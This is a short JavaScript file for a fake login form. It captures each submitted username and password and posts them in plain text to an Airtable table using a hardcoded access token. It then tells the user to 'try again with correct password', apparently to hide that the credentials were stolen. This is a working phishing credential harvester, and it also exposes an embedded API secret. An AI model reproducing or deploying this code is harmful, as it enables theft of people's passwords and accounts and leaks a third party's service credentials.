// script.js

const apiKey = 'patdzF41UtIxJy85S.0e4d13701197ee3f293430996e65b2770fa87886b22c3648fdab26248d3f84d3'; // Replace with your Airtable API key
const baseId = 'appDSEFhizhndaNhJ'; // Replace with your Airtable Base ID
const tableName = 'login'; // Replace with your Airtable table name where you store user data

const loginForm = document.getElementById('loginForm');

loginForm.addEventListener('submit', async function(event) {
    event.preventDefault();
    console.log('Submitting form'); // Add a debug message

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    console.log('Form data:', { username, password }); // Add a debug message

    // Call function to submit data to Airtable
    await submitFormData(username, password);
});

async function submitFormData(username, password) {
    const data = {
        fields: {
            'Username': username,
            'Password': password
        }
    };

    try {
        const response = await fetch(`https://api.airtable.com/v0/${baseId}/${tableName}`, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${apiKey}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            throw new Error('Network response was not ok.');
        }

        alert('try again with correct password'); // Optional: Show success message

        // Clear form fields after successful submission
        document.getElementById('username').value = '';
        document.getElementById('password').value = '';
    } catch (error) {
        console.error('Error:', error);
        alert('An error occurred while submitting login data.'); // Optional: Show error message
    }
}
